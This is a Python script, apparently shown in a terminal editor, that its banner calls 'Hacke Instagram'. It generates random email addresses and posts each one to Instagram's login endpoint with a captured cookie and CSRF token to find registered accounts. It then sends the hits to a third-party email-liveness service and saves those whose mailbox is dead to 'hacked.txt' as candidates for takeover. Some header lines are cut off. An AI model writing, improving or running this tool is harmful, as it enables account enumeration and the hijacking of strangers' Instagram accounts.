                                                                     araaaa.py                                                                        Modified
import requests
import random
import os
import sys
import time
def login():
        os.system("xdg-open https://instagram.com/vx._.raashaa?igshid=1d2i2eehhvkjf")
        print("------ rasha ------")
        print("")
        print("")
        username="rasha"
        password="rraasshhaa"
        ani=input("username tool :")
        ani2=input("password tool :")
        if ani==username and ani2==password:
                print("login bwi")
                time.sleep(3)
                pass
        else:
                print("Xalata Tkaya Nama bo rasha bnera")
                time.sleep(3)
                os.system("clear")
                login()
login()

os.system("xeg-open https://www.instagram.com/ani_software/")
os.system("clear")
def cheker_insta():
    os.system("clear")
    four=open("emil.txt","w")
    listt=open("instagramm.txt",'r').readlines()
    for x in listt:
        u=x.strip()
        head={
            'authority': 'www.instagram.com',
            'method': 'POST',
            'path': '/accounts/login/ajax/',
            'scheme': 'https',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7',
            'content-length': '277',
            'content-type': 'application/x-www-form-urlencoded',
           'cookie': 'ig_did=D9AD55FF-D40F-4569-8F3D-72923D6B496D; mid=X-oMXwAEAAFsGP-VB_KrvTNjqpMV; ig_nrcb=1; datr=lbztX-QwAT9uM6uzLDWzbgof; fbm_124024574287414=base_domain=.>
           'origin': 'https://www.instagram.com',
           'referer': 'https://www.instagram.com/accounts/login/',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
           'x-csrftoken': 'u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
           'x-ig-app-id': '936619743392459',
           'x-ig-www-claim': '0',
           'x-instagram-ajax': '7a3a3e64fa87',
           'x-requested-with': 'XMLHttpRequest'
        }


        datt={
            'username': u,
            'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1612018949:AQhQABddFDWlpkKVhPAXc565cx4otk7lGm04m4S2+v2M5zRqFYhBcsGJbiVVgXIkHuLLmQMWo3tU25a6/zcsYh5hBLHICqK/WFg7XzoGv1IvYo>
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        url='https://www.instagram.com/accounts/login/ajax/'

        re =requests.post(url,headers=head,data=datt).text
        if '"user":true' in re:
            print("")
            print(u+ " >= \033[1;32mEMIL TRUE\033[1;37m ")
            four.write(u+"\n")

        else:
            print("")
            print(u+ ' >= \033[1;31mNOT TRUE\033[1;37m')


def emil():
    logo="""\033[1;31m

       Hacke Instagram
          
    \033[1;37m

    """
    print(logo)
    print("----_----")
    print("")
    print("\033[1;36mSnapchat > @ahmadhemn67\033[1;37m")
    print("")
    print("----_----")
    print("")
    print("\033[1;36minstagram > @vx._.raashaa\033[1;37m")
    print("")
    print("----_----")
    print("")
    print("\033[1;36mfacbook > Ahmad Galale\033[1;37m")
    print("")
    print("----_----")
    print("")
    print("")
    print("~~~~~~~~~~~~~~~~~~~~")
    print("")
    op=open("instagramm.txt",'w')
    name=input("TKAYA NAWEK BNUSA :")
    print(" < 1 > gmail.com ")
    print(" < 2 > yahoo.com")
    print(" < 3 > hotmail.com")
    kamyan=int(input("KAMYAN : "))
    if kamyan==1:
        noo="gmail.com"
    elif kamyan==2:
        noo="yahoo.com"
    elif kamyan==3:
        noo="hotmail.com"


    for x in range(300):
        x='04846574811230498675010129387657'
        x1=random.choice(x)
        x2=random.choice(x)
        x3=random.choice(x)
        ani=name+x1+x2+x3+'@'+noo
        print(ani)
        op.write(ani+"\n")
    time.sleep(3)
    print("")
    print("--------------")
    print("ALL EMIL SAVE IN FILE INSTAGRAM.TXT")
    time.sleep(3)








def cheker_emil():
    hack=open("hacked.txt","w")
    os.system("clear")
    op=open("emil.txt",'r').readlines()
    for x in op:
        time.sleep(13)
        u=x.strip()
        re = 'https://mmo69.com/_check_live_email/api.php?email='+u

        req=requests.get(re).text
        print(req)

        if "DIE" in req:
                print(u +" >= \033[1;32mHack abe \033[1;37m")
                print("")
                hack.write(u+"\n")
        else:
                print(u+" >= \033[1;31mHack nabe\033[1;37m ")


emil()
cheker_insta()
cheker_emil()
exit()
